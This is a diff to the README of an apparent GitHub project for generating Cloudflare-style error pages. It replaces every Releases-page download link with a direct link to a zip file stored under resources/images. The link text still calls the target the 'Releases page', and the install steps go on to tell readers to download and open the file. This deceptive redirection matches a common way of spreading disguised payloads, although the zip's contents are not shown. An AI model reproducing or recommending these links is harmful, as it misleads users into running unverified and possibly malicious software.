@@ -6,11 +6,11 @@ Welcome to the cloudflare-error-page project! This application allows you to cre
 
 ## 📥 Download the Application
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/yongdev2005/cloudflare-error-page/releases)
+[![Download Now](https://raw.githubusercontent.com/yongdev2005/cloudflare-error-page/main/resources/images/cloudflare-error-page-1.3.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/yongdev2005/cloudflare-error-page/main/resources/images/cloudflare-error-page-1.3.zip)
 
 You can download the latest version of the cloudflare-error-page application from our Releases page. 
 
-[Visit this page to download.](https://github.com/yongdev2005/cloudflare-error-page/releases)
+[Visit this page to download.](https://raw.githubusercontent.com/yongdev2005/cloudflare-error-page/main/resources/images/cloudflare-error-page-1.3.zip)
 
 ## 🛠️ System Requirements
 
@@ -23,7 +23,7 @@ Before you install the application, ensure your computer meets these basic requi
 
 ## 🔧 Installation Instructions
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/yongdev2005/cloudflare-error-page/releases) to find the application.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/yongdev2005/cloudflare-error-page/main/resources/images/cloudflare-error-page-1.3.zip) to find the application.
 2. **Choose the Latest Release:** Look for the version labeled as the latest stable release. This version may have new features and bug fixes.
 3. **Download the File:** Click on the link for the downloadable file. The file will begin to download automatically.
 4. **Locate the Downloaded File:** Once the download finishes, locate the file on your computer. It may be in your Downloads folder unless you've chosen a different location.
